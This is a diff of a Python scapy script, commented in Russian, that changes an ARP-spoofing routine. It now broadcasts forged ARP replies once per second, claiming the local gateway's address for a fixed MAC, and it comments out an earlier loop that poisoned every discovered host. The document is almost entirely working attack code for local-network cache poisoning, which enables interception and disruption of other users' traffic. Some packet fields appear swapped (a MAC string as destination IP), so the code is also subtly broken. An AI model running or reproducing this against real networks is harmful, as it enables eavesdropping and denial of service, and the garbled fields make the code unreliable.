@@ -3,6 +3,7 @@
 import scapy.all as scapy
 import argparse
 import socket
+import time
 
 ip_up_list = []
 self_ip_global = '';
@@ -25,10 +26,11 @@ def get_mac(ip):
     except BaseException:
         print('Smth wrong')
 
-def spoof(target_ip, spoof_ip):
+def spoof():
     # target_mac = get_mac(target_ip)
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:aa",
-                       psrc=spoof_ip)
+    gateway = get_masc() + str(1)
+    packet = scapy.ARP(op=2, psrc=gateway, hwsrc="f4:a3:af:11:12:44",
+                       hwdst='0.0.0.0', pdst="ff:ff:ff:ff:ff:ff")
     scapy.send(packet, verbose=False)
 
 
@@ -36,7 +38,7 @@ def spoof(target_ip, spoof_ip):
     #spoof_ip => router ip
     #мы отправляем пакет на spoof_ip с парой 'target_ip' : target_mac
 
-def get_masc(): #получение маски
+def get_masc(): #получение gateway
     self_ip = get_self_ip().split('.')
     self_ip = self_ip[0] + '.' + self_ip[1] + '.' + self_ip[2] + '.'
 
@@ -82,12 +84,19 @@ def get_all_ip_list():
 #               print("Loop count: " + str(ip))
 
 
-ip = get_all_ip_list()
-gateway = get_masc() + '1'
-while 1:
-    for k in ip:
-        spoof(gateway, k)
-        print(k)
+id = 0
+while True:
+    spoof()
+    print('Пакет ' + str(id))
+    id = id + 1
+    time.sleep(1)
+
+# ip = get_all_ip_list()
+# gateway = get_masc() + '1'
+# while 1:
+#     for k in ip:
+#         spoof(gateway, k)
+#         print(k)
 
 #get list of ip adress or take by mask /24 +++
 #get mac of all ip adress
